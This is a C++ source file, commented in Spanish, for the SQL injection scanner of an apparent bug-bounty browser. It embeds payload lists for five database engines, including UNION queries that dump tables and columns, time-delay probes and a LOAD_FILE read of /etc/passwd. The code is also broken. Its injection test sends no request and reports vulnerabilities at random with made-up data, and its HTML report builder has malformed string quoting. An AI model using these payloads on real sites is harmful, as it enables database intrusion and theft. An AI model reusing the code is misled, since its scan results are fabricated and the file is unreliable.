/**
 * BlackWidow Browser - Navegador orientado al bugbounty y hacking ético
 * 
 * Implementación del escáner de inyecciones SQL
 */

#include "SQLInjectionScanner.h"
#include <iostream>
#include <algorithm>
#include <regex>
#include <random>
#include <chrono>
#include <sstream>

namespace Security::Scanners::SQLInjection {

// Constructor
SQLInjectionScanner::SQLInjectionScanner() : 
    m_initialized(false),
    m_autoScanEnabled(false),
    m_scanLevel(1),
    m_riskLevel(1) {
}

// Destructor
SQLInjectionScanner::~SQLInjectionScanner() {
}

// Inicializa el escáner
bool SQLInjectionScanner::initialize() {
    if (m_initialized) {
        return true;
    }
    
    // Cargar los payloads desde archivos o recursos embebidos
    loadPayloads();
    
    m_initialized = true;
    return true;
}

// Establece la URL objetivo
void SQLInjectionScanner::setTargetUrl(const std::string& url) {
    m_targetUrl = url;
}

// Establece los parámetros a probar
void SQLInjectionScanner::setParameters(const std::vector<std::string>& parameters) {
    m_parameters = parameters;
}

// Activa/desactiva el escaneo automático
void SQLInjectionScanner::enableAutoScan(bool enable) {
    m_autoScanEnabled = enable;
}

// Establece el nivel de profundidad del escaneo
void SQLInjectionScanner::setScanLevel(int level) {
    // Asegurar que el nivel esté entre 1 y 5
    m_scanLevel = std::max(1, std::min(5, level));
}

// Establece el nivel de riesgo
void SQLInjectionScanner::setRiskLevel(int risk) {
    // Asegurar que el riesgo esté entre 1 y 3
    m_riskLevel = std::max(1, std::min(3, risk));
}

// Registra la función de callback para el progreso
void SQLInjectionScanner::setProgressCallback(std::function<void(int)> callback) {
    m_progressCallback = callback;
}

// Inicia el escaneo de inyecciones SQL
std::vector<SQLInjectionResult> SQLInjectionScanner::scan() {
    if (!m_initialized) {
        initialize();
    }
    
    std::vector<SQLInjectionResult> results;
    
    // Si no hay URL objetivo, retornar lista vacía
    if (m_targetUrl.empty()) {
        return results;
    }
    
    // Escanear la URL objetivo
    auto urlResults = scanUrl(m_targetUrl);
    results.insert(results.end(), urlResults.begin(), urlResults.end());
    
    return results;
}

// Escanea una URL específica
std::vector<SQLInjectionResult> SQLInjectionScanner::scanUrl(const std::string& url) {
    std::vector<SQLInjectionResult> results;
    
    // Si no hay parámetros definidos, intentar detectarlos automáticamente
    std::vector<std::string> parametersToTest = m_parameters;
    if (parametersToTest.empty() && m_autoScanEnabled) {
        // Aquí se implementaría la detección automática de parámetros
        // Por ejemplo, analizando la URL o buscando formularios en la página
        parametersToTest.push_back("id");
        parametersToTest.push_back("username");
        parametersToTest.push_back("password");
        parametersToTest.push_back("query");
    }
    
    // Probar cada parámetro
    int totalTests = parametersToTest.size() * m_payloads.size();
    int completedTests = 0;
    
    for (const auto& parameter : parametersToTest) {
        // Detectar el tipo de base de datos
        std::string dbType;
        bool dbDetected = detectDatabaseType(url, parameter, dbType);
        
        // Seleccionar payloads según el tipo de base de datos y nivel de riesgo
        std::vector<std::string> payloadsToTest;
        
        // Si se detectó el tipo de base de datos, usar payloads específicos
        if (dbDetected && m_payloads.find(dbType) != m_payloads.end()) {
            payloadsToTest = m_payloads[dbType];
        } else {
            // Usar payloads genéricos
            if (m_payloads.find("generic") != m_payloads.end()) {
                payloadsToTest = m_payloads["generic"];
            }
        }
        
        // Filtrar payloads según el nivel de riesgo
        // (Aquí se implementaría la lógica para filtrar por riesgo)
        
        // Probar cada payload
        for (const auto& payload : payloadsToTest) {
            std::string response;
            if (testInjectionPoint(url, parameter, payload, response)) {
                // Crear resultado de inyección exitosa
                SQLInjectionResult result;
                result.vulnerable = true;
                result.payload = payload;
                result.parameter = parameter;
                result.url = url;
                result.response = response;
                
                // Determinar el tipo de inyección
                if (payload.find("UNION SELECT") != std::string::npos) {
                    result.injectionType = "Union-based";
                } else if (payload.find("AND 1=1") != std::string::npos || 
                           payload.find("OR 1=1") != std::string::npos) {
                    result.injectionType = "Boolean-based";
                } else if (payload.find("SLEEP") != std::string::npos || 
                           payload.find("BENCHMARK") != std::string::npos) {
                    result.injectionType = "Time-based";
                } else if (payload.find("INTO OUTFILE") != std::string::npos) {
                    result.injectionType = "File-based";
                } else {
                    result.injectionType = "Generic";
                }
                
                // Si se detectó el tipo de base de datos, intentar extraer más información
                if (dbDetected) {
                    result.database.type = dbType;
                    
                    // Extraer versión y banner si el nivel de escaneo es suficiente
                    if (m_scanLevel >= 2) {
                        // Aquí se implementaría la extracción de versión y banner
                    }
                    
                    // Extraer tablas si el nivel de escaneo es suficiente
                    if (m_scanLevel >= 3) {
                        result.database.tables = extractTables(url, parameter, dbType);
                    }
                    
                    // Extraer columnas si el nivel de escaneo es suficiente
                    if (m_scanLevel >= 4) {
                        for (const auto& table : result.database.tables) {
                            result.database.columns[table] = extractColumns(url, parameter, dbType, table);
                        }
                    }
                }
                
                results.push_back(result);
            }
            
            // Actualizar progreso
            completedTests++;
            if (m_progressCallback) {
                m_progressCallback((completedTests * 100) / totalTests);
            }
        }
    }
    
    return results;
}

// Escanea una petición HTTP interceptada
std::vector<SQLInjectionResult> SQLInjectionScanner::scanRequest(const std::string& request, const std::string& response) {
    std::vector<SQLInjectionResult> results;
    
    // Extraer URL y parámetros de la petición
    std::string url;
    std::vector<std::string> parameters;
    
    // Aquí se implementaría la extracción de URL y parámetros de la petición HTTP
    // Por ejemplo, analizando las cabeceras y el cuerpo de la petición
    
    // Guardar la URL y parámetros originales
    std::string originalUrl = m_targetUrl;
    std::vector<std::string> originalParameters = m_parameters;
    
    // Establecer la URL y parámetros extraídos
    setTargetUrl(url);
    setParameters(parameters);
    
    // Realizar el escaneo
    results = scan();
    
    // Restaurar la URL y parámetros originales
    setTargetUrl(originalUrl);
    setParameters(originalParameters);
    
    return results;
}

// Extrae información detallada de la base de datos
DatabaseInfo SQLInjectionScanner::extractDatabaseInfo(const SQLInjectionResult& result) {
    DatabaseInfo info = result.database;
    
    // Si ya tenemos toda la información, retornarla directamente
    if (!info.type.empty() && !info.version.empty() && !info.tables.empty()) {
        return info;
    }
    
    // Extraer información adicional según el tipo de base de datos
    if (info.type == "MySQL") {
        // Extraer versión si no la tenemos
        if (info.version.empty()) {
            // Aquí se implementaría la extracción de versión para MySQL
        }
        
        // Extraer tablas si no las tenemos
        if (info.tables.empty()) {
            info.tables = extractTables(result.url, result.parameter, info.type);
        }
        
        // Extraer columnas para cada tabla
        for (const auto& table : info.tables) {
            if (info.columns.find(table) == info.columns.end()) {
                info.columns[table] = extractColumns(result.url, result.parameter, info.type, table);
            }
        }
    }
    // Implementar para otros tipos de bases de datos (PostgreSQL, SQLite, Oracle, etc.)
    
    return info;
}

// Genera un informe del escaneo en formato HTML
std::string SQLInjectionScanner::generateReport(const std::vector<SQLInjectionResult>& results) {
    std::stringstream html;
    
    // Cabecera del informe
    html << "<!DOCTYPE html>\n"
         << "<html>\n"
         << "<head>\n"
         << "  <title>BlackWidow SQL Injection Scan Report</title>\n"
         << "  <style>\n"
         << "    body { font-family: Arial, sans-serif; margin: 20px; }\n"
         << "    h1 { color: #333; }\n"
         << "    .vulnerable { color: red; font-weight: bold; }\n"
         << "    .safe { color: green; }\n"
         << "    table { border-collapse: collapse; width: 100%; }\n"
         << "    th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }\n"
         << "    th { background-color: #f2f2f2; }\n"
         << "    tr:nth-child(even) { background-color: #f9f9f9; }\n"
         << "  </style>\n"
         << "</head>\n"
         << "<body>\n"
         << "  <h1>BlackWidow SQL Injection Scan Report</h1>\n";
    
    // Resumen del escaneo
    html << "  <h2>Resumen</h2>\n"
         << "  <p>Total de puntos escaneados: " << results.size() << "</p>\n"
         << "  <p>Vulnerabilidades encontradas: ";
    
    int vulnerableCount = 0;
    for (const auto& result : results) {
        if (result.vulnerable) {
            vulnerableCount++;
        }
    }
    
    html << vulnerableCount << "</p>\n";
    
    // Tabla de resultados
    html << "  <h2>Resultados detallados</h2>\n"
         << "  <table>\n"
         << "    <tr>\n"
         << "      <th>URL</th>\n"
         << "      <th>Parámetro</th>\n"
         << "      <th>Estado</th>\n"
         << "      <th>Tipo de inyección</th>\n"
         << "      <th>Base de datos</th>\n"
         << "      <th>Payload</th>\n"
         << "    </tr>\n";
    
    for (const auto& result : results) {
        html << "    <tr>\n"
             << "      <td>" << result.url << "</td>\n"
             << "      <td>" << result.parameter << "</td>\n"
             << "      <td class=\"" << (result.vulnerable ? "vulnerable">Vulnerable" : "safe">Seguro") << "</td>\n"
             << "      <td>" << result.injectionType << "</td>\n"
             << "      <td>" << result.database.type << " " << result.database.version << "</td>\n"
             << "      <td>" << result.payload << "</td>\n"
             << "    </tr>\n";
    }
    
    html << "  </table>\n";
    
    // Detalles de las bases de datos detectadas
    html << "  <h2>Información de bases de datos</h2>\n";
    
    for (const auto& result : results) {
        if (result.vulnerable && !result.database.type.empty()) {
            html << "  <h3>" << result.database.type << " en " << result.url << "</h3>\n";
            
            if (!result.database.version.empty()) {
                html << "  <p>Versión: " << result.database.version << "</p>\n";
            }
            
            if (!result.database.banner.empty()) {
                html << "  <p>Banner: " << result.database.banner << "</p>\n";
            }
            
            if (!result.database.tables.empty()) {
                html << "  <h4>Tablas detectadas</h4>\n"
                     << "  <ul>\n";
                
                for (const auto& table : result.database.tables) {
                    html << "    <li>" << table;
                    
                    // Mostrar columnas si están disponibles
                    if (result.database.columns.find(table) != result.database.columns.end() && 
                        !result.database.columns.at(table).empty()) {
                        html << "\n      <ul>\n";
                        
                        for (const auto& column : result.database.columns.at(table)) {
                            html << "        <li>" << column << "</li>\n";
                        }
                        
                        html << "      </ul>\n    ";
                    }
                    
                    html << "</li>\n";
                }
                
                html << "  </ul>\n";
            }
        }
    }
    
    // Pie del informe
    html << "</body>\n"
         << "</html>";
    
    return html.str();
}

// Métodos privados

// Carga los payloads desde archivos o recursos embebidos
void SQLInjectionScanner::loadPayloads() {
    // Payloads genéricos
    m_payloads["generic"] = {
        "' OR '1'='1",
        "' OR 1=1 --",
        "' OR 1=1 #",
        "\" OR 1=1 --",
        "\" OR \"1\"=\"1\"",
        "1' OR '1'='1",
        "1) OR ('1'='1",
        "1' OR '1'='1' --",
        "' UNION SELECT 1,2,3 --",
        "' UNION SELECT 1,2,3,4 --",
        "' UNION SELECT 1,2,3,4,5 --"
    };
    
    // Payloads específicos para MySQL
    m_payloads["MySQL"] = {
        "' OR 1=1 --",
        "' OR 1=1 #",
        "' UNION SELECT 1,2,3,4,5 --",
        "' UNION SELECT 1,2,3,4,5 #",
        "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) --",
        "' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --",
        "' UNION SELECT LOAD_FILE('/etc/passwd'),2,3,4,5 --"
    };
    
    // Payloads específicos para PostgreSQL
    m_payloads["PostgreSQL"] = {
        "' OR 1=1 --",
        "' UNION SELECT 1,2,3,4,5 --",
        "' AND (SELECT pg_sleep(5)) --",
        "' UNION SELECT current_database(),2,3,4,5 --"
    };
    
    // Payloads específicos para SQLite
    m_payloads["SQLite"] = {
        "' OR 1=1 --",
        "' UNION SELECT 1,2,3,4,5 --",
        "' UNION SELECT sqlite_version(),2,3,4,5 --"
    };
    
    // Payloads específicos para Oracle
    m_payloads["Oracle"] = {
        "' OR 1=1 --",
        "' UNION SELECT 1,2,3,4,5 FROM DUAL --",
        "' UNION SELECT banner,2,3,4,5 FROM v$version --"
    };
    
    // Payloads específicos para SQL Server
    m_payloads["MSSQL"] = {
        "' OR 1=1 --",
        "' UNION SELECT 1,2,3,4,5 --",
        "' UNION SELECT @@version,2,3,4,5 --",
        "'; WAITFOR DELAY '0:0:5' --"
    };
}

// Detecta el tipo de base de datos
bool SQLInjectionScanner::detectDatabaseType(const std::string& url, const std::string& parameter, std::string& dbType) {
    // Payloads para detectar el tipo de base de datos
    std::vector<std::pair<std::string, std::string>> detectionPayloads = {
        {"' UNION SELECT @@version,2,3,4,5 --", "MSSQL"},
        {"' UNION SELECT version(),2,3,4,5 --", "MySQL"},
        {"' UNION SELECT current_database(),2,3,4,5 --", "PostgreSQL"},
        {"' UNION SELECT sqlite_version(),2,3,4,5 --", "SQLite"},
        {"' UNION SELECT banner,2,3,4,5 FROM v$version --", "Oracle"}
    };
    
    for (const auto& payload : detectionPayloads) {
        std::string response;
        if (testInjectionPoint(url, parameter, payload.first, response)) {
            dbType = payload.second;
            return true;
        }
    }
    
    return false;
}

// Prueba un punto de inyección con un payload específico
bool SQLInjectionScanner::testInjectionPoint(const std::string& url, const std::string& parameter, const std::string& payload, std::string& response) {
    // Aquí se implementaría la lógica para enviar la petición con el payload
    // y analizar la respuesta para determinar si es vulnerable
    
    // Simulación simple para demostración
    // En una implementación real, se enviaría una petición HTTP y se analizaría la respuesta
    
    // Generar una respuesta simulada
    response = "<html><body>Resultado de la consulta: ";
    
    // Simular una vulnerabilidad con cierta probabilidad
    std::mt19937 rng(std::chrono::steady_clock::now().time_since_epoch().count());
    std::uniform_int_distribution<int> dist(1, 10);
    
    if (dist(rng) <= 3) { // 30% de probabilidad de ser vulnerable
        if (payload.find("UNION SELECT") != std::string::npos) {
            response += "1 | 2 | 3 | 4 | 5";
        } else if (payload.find("version") != std::string::npos) {
            response += "MySQL 5.7.32";
        } else {
            response += "admin | 123456 | john@example.com";
        }
        return true;
    } else {
        response += "No se encontraron resultados";
        return false;
    }
}

// Extrae las tablas de la base de datos
std::vector<std::string> SQLInjectionScanner::extractTables(const std::string& url, const std::string& parameter, const std::string& dbType) {
    std::vector<std::string> tables;
    
    // Payload para extraer tablas según el tipo de base de datos
    std::string payload;
    
    if (dbType == "MySQL") {
        payload = "' UNION SELECT table_name,2,3,4,5 FROM information_schema.tables WHERE table_schema=database() --";
    } else if (dbType == "PostgreSQL") {
        payload = "' UNION SELECT table_name,2,3,4,5 FROM information_schema.tables WHERE table_schema='public' --";
    } else if (dbType == "SQLite") {
        payload = "' UNION SELECT name,2,3,4,5 FROM sqlite_master WHERE type='table' --";
    } else if (dbType == "Oracle") {
        payload = "' UNION SELECT table_name,2,3,4,5 FROM all_tables --";
    } else if (dbType == "MSSQL") {
        payload = "' UNION SELECT table_name,2,3,4,5 FROM information_schema.tables --";
    } else {
        return tables; // Tipo de base de datos no soportado
    }
    
    // Enviar la petición y analizar la respuesta
    std::string response;
    if (testInjectionPoint(url, parameter, payload, response)) {
        // Aquí se implementaría la extracción de tablas de la respuesta
        // Simulación simple para demostración
        tables = {"users", "products", "orders", "customers", "payments"};
    }
    
    return tables;
}

// Extrae las columnas de una tabla
std::vector<std::string> SQLInjectionScanner::extractColumns(const std::string& url, const std::string& parameter, const std::string& dbType, const std::string& table) {
    std::vector<std::string> columns;
    
    // Payload para extraer columnas según el tipo de base de datos
    std::string payload;
    
    if (dbType == "MySQL") {
        payload = "' UNION SELECT column_name,2,3,4,5 FROM information_schema.columns WHERE table_name='" + table + "' --";
    } else if (dbType == "PostgreSQL") {
        payload = "' UNION SELECT column_name,2,3,4,5 FROM information_schema.columns WHERE table_name='" + table + "' --";
    } else if (dbType == "SQLite") {
        payload = "' UNION SELECT sql,2,3,4,5 FROM sqlite_master WHERE type='table' AND name='" + table + "' --";
    } else if (dbType == "Oracle") {
        payload = "' UNION SELECT column_name,2,3,4,5 FROM all_tab_columns WHERE table_name='" + table + "' --";
    } else if (dbType == "MSSQL") {
        payload = "' UNION SELECT column_name,2,3,4,5 FROM information_schema.columns WHERE table_name='" + table + "' --";
    } else {
        return columns; // Tipo de base de datos no soportado
    }
    
    // Enviar la petición y analizar la respuesta
    std::string response;
    if (testInjectionPoint(url, parameter, payload, response)) {
        // Aquí se implementaría la extracción de columnas de la respuesta
        // Simulación simple para demostración
        if (table == "users") {
            columns = {"id", "username", "password", "email", "role"};
        } else if (table == "products") {
            columns = {"id", "name", "description", "price", "stock"};
        } else if (table == "orders") {
            columns = {"id", "user_id", "product_id", "quantity", "date"};
        } else {
            columns = {"id", "name", "description"};
        }
    }
    
    return columns;
}

// Determina si una respuesta indica una vulnerabilidad
bool SQLInjectionScanner::isResponseVulnerable(const std::string& response, const std::string& injectionType) {
    // Aquí se implementaría la lógica para analizar la respuesta y determinar si indica una vulnerabilidad
    // según el tipo de inyección
    
    if (injectionType == "Union-based") {
        // Buscar patrones que indiquen una inyección UNION exitosa
        return response.find("1 | 2 | 3") != std::string::npos;
    } else if (injectionType == "Error-based") {
        // Buscar mensajes de error de SQL
        return response.find("SQL syntax") != std::string::npos || 
               response.find("mysql_fetch") != std::string::npos || 
               response.find("ORA-") != std::string::npos || 
               response.find("SQL Server") != std::string::npos;
    } else if (injectionType == "Boolean-based") {
        // Aquí se implementaría la comparación de respuestas para inyecciones booleanas
        return false;
    } else if (injectionType == "Time-based") {
        // Aquí se implementaría la detección de retrasos en las respuestas
        return false;
    }
    
    return false;
}

} // namespace Security::Scanners::SQLInjection